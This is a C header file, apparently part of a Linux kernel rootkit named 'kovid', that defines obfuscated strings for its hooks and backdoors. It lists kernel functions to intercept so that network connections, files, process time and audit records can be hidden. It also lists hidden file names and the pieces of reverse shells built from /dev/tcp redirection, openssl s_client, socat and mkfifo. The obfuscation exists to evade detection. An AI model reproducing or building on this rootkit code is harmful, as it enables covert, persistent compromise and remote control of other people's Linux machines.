#ifndef __OBFSTR_H
#define __OBFSTR_H

/**
 * Hooks
 */

/** kallsyms_lookup_name */
#define _OBF_KALLSYMS_LOOKUP_NAME  "\000k\001a\002l\003l\004s\005y\006m\007s\010_\011l\012o\013o\014k\015u\016p\017_\020n\021a\022m\023e"


/** tcp4_seq_show */
#define _OBF_TCP4_SEQ_SHOW  "\000t\001c\002p\0034\004_\005s\006e\007q\010_" \
                            "\011s\012h\013o\014w"

/** udp4_seq_show */
#define _OBF_UDP4_SEQ_SHOW  "\000u\001d\002p\0034\004_\005s\006e\007q\010_" \
                            "\011s\012h\013o\014w"

/** tcp6_seq_show */
#define _OBF_TCP6_SEQ_SHOW  "\000t\001c\002p\0036\004_\005s\006e\007q\010_" \
                            "\011s\012h\013o\014w"

/** udp6_seq_show */
#define _OBF_UDP6_SEQ_SHOW  "\000u\001d\002p\0036\004_\005s\006e\007q\010_" \
                            "\011s\012h\013o\014w"

/** packet_rcv */
#define _OBF_PACKET_RCV  "\000p\001a\002c\003k\004e\005t\006_\007r\010c\011v"

/** tpacket_rcv */
#define _OBF_TPACKET_RCV    "\000t\001p\002a\003c\004k\005e\006t\007_\010r"   \
                            "\011c\012v"

/** account_process_tick */
#define _OBF_ACCOUNT_PROCESS_TICK   "\000a\001c\002c\003o\004u\005n\006t\007_"  \
                                    "\010p\011r\012o\013c\014e\015s\016s\017_"  \
                                    "\020t\021i\022c\023k"

/** account_system_time */
#define _OBF_ACCOUNT_SYSTEM_TIME    "\000a\001c\002c\003o\004u\005n\006t\007_"  \
                                    "\010s\011y\012s\013t\014e\015m\016_\017t"  \
                                    "\020i\021m\022e"

/** audit_log_start */
#define _OBF_AUDIT_LOG_START    "\000a\001u\002d\003i\004t\005_\006l\007o\010g"   \
                                "\011_\012s\013t\014a\015r\016t"

/** filldir */
#define _OBF_FILLDIR  "\000f\001i\002l\003l\004d\005i\006r"

/** filldir64 */
#define _OBF_FILLDIR64  "\000f\001i\002l\003l\004d\005i\006r\0076\0104"

/** tty_read */
#define _OBF_TTY_READ  "\000t\001t\002y\003_\004r\005e\006a\007d"

/**
 * Misc strings
 */

//** md5sum */
#define _OBF_MD5SUM  "\000m\001d\0025\003s\004u\005m"

/**
 * User commands
 */

/**
 * Hidden files & directories
 */

/** .kovid */
#define _OBF__KOVID  "\000.\001k\002o\003v\004i\005d"

/** kovid */
#define _OBF_KOVID  "\000k\001o\002v\003i\004d"

/** kovid.ko */
#define _OBF_KOVID_KO  "\000k\001o\002v\003i\004d\005.\006k\007o"

/** .kv.ko */
#define _OBF__KV_KO  "\000.\001k\002v\003.\004k\005o"

/** .o4udk */
#define _OBF__O4UDK  "\000.\001o\0024\003u\004d\005k"

/** .lm.sh */
#define _OBF__LM_SH  "\000.\001l\002m\003.\004s\005h"

/** .sshd.orig */
#define _OBF__SSHD_ORIG  "\000.\001s\002s\003h\004d\005.\006o\007r\010i\011g"

/** .ljd3p */
#define _OBF__LJD3P  "\000.\001l\002j\003d\0043\005p"

/** .stfu */
#define _OBF__STFU  "\000.\001s\002t\003f\004u"

/** irq/100_pciehp */
#define _OBF_IRQ_100_PCIEHP "\000i\001r\002q\003/\0041\0050\0060\007_\010p"    \
                            "\011c\012i\013e\014h\015p"

/** irq/101_pciehp */
#define _OBF_IRQ_101_PCIEHP "\000i\001r\002q\003/\0041\0050\0061\007_\010p"    \
                            "\011c\012i\013e\014h\015p"

/** irq/102_pciehp */
#define _OBF_IRQ_102_PCIEHP "\000i\001r\002q\003/\0041\0050\0062\007_\010p"    \
                            "\011c\012i\013e\014h\015p"

/**
 * backdoors
 */
/** OPENSSL */
#define _OBF_OPENSSL  "\000O\001P\002E\003N\004S\005S\006L"

/** verify=0 */
#define _OBF_VERIFY_0  "\000v\001e\002r\003i\004f\005y\006=\0070"

/** EXEC */
#define _OBF_EXEC  "\000E\001X\002E\003C"

/** tail -F -n +1 /var/ */
#define _OBF_TAIL   "\000t\001a\002i\003l\004 \005-\006F\007 \010-\011n\012 " \
                    "\013+\0141\015 \016/\017v\020a\021r\022/"

/** /bin/bash */
#define _OBF__BIN_BASH  "\000/\001b\002i\003n\004/\005b\006a\007s\010h"

/** /bin/sh */
#define _OBF_BIN_SH  "\000/\001b\002i\003n\004/\005s\006h"

/** /tmp */
#define _OBF_TMP  "\000/\001t\002m\003p"

/** /usr/bin/mkfifo */
#define _OBF_USR_BIN_MKFIFO  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011m\012k\013f\014i\015f\016o"

/** s_client -quiet -connect */
#define _OBF_SCLIENT__QUIET__CONNECT  "\000s\001_\002c\003l\004i\005e\006n\007t\010 \011-\012q\013u\014i\015e\016t\017 \020-\021c\022o\023n\024n\025e\026c\027t"

/** 2>&1 */
#define _OBF_STD_TWO  "\0002\001>\002&\0031"

/** /dev/tcp */
#define _OBF_DEV_TCP  "\000/\001d\002e\003v\004/\005t\006c\007p"

/** 0>&1 */
#define _OBF_STD_ZERO  "\0000\001>\002&\0031"

/** -i >& */
#define _OBF__INTERACTIVE  "\000-\001i\002 \003>\004&"

/** -c */
#define _OBF__C  "\000-\001c"

/** HOME=/ */
#define _OBF_HOME  "\000H\001O\002M\003E\004=\005/"

/** TERM=linux */
#define _OBF_TERM_LINUX  "\000T\001E\002R\003M\004=\005l\006i\007n\010u\011x"

/* /usr/bin/openssl */
#define _OBF_USR_BIN_OPENSSL  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011o\012p\013e\014n\015s\016s\017l"

/* /bin/openssl */
#define _OBF_BIN_OPENSSL  "\000/\001b\002i\003n\004/\005o\006p\007e\010n\011s\012s\013l"

/* /var/.openssl */
#define _OBF_VAR_OPENSSL  "\000/\001v\002a\003r\004/\005.\006o\007p\010e\011n\012s\013s\014l"

/* /usr/bin/socat */
#define _OBF_USR_BIN_SOCAT  "\000/\001u\002s\003r\004/\005b\006i\007n\010/\011s\012o\013c\014a\015t"

/* /bin/socat */
#define _OBF_BIN_SOCAT  "\000/\001b\002i\003n\004/\005s\006o\007c\010a\011t"

/* /var/.socat */
#define _OBF_VAR_SOCAT  "\000/\001v\002a\003r\004/\005.\006s\007o\010c\011a\012t"

/*
 * Other function addresses
 */
/* attach_pid */
#define _OBF_ATTACH_PID  "\000a\001t\002t\003a\004c\005h\006_\007p\010i\011d"

/* __x64_sys_setreuid */
#define _OBF_X64_SYS_SETREUID  "\000_\001_\002x\0036\0044\005_\006s\007y\010s\011_\012s\013e\014t\015r\016e\017u\020i\021d"

#define _OBF_WHITENOSE  "\000w\001h\002i\003t\004e\005n\006o\007s\010e"
#define _OBF_PINKNOSE  "\000p\001i\002n\003k\004n\005o\006s\007e"
#define _OBF_REDNOSE  "\000r\001e\002d\003n\004o\005s\006e"
#define _OBF_BLACKNOSE  "\000b\001l\002a\003c\004k\005n\006o\007s\010e"
#define _OBF_GREYNOSE  "\000g\001r\002e\003y\004n\005o\006s\007e"
#define _OBF_PURPLENOSE  "\000p\001u\002r\003p\004l\005e\006n\007o\010s\011e"
#define _OBF_BLUENOSE  "\000b\001l\002u\003e\004n\005o\006s\007e"


#endif
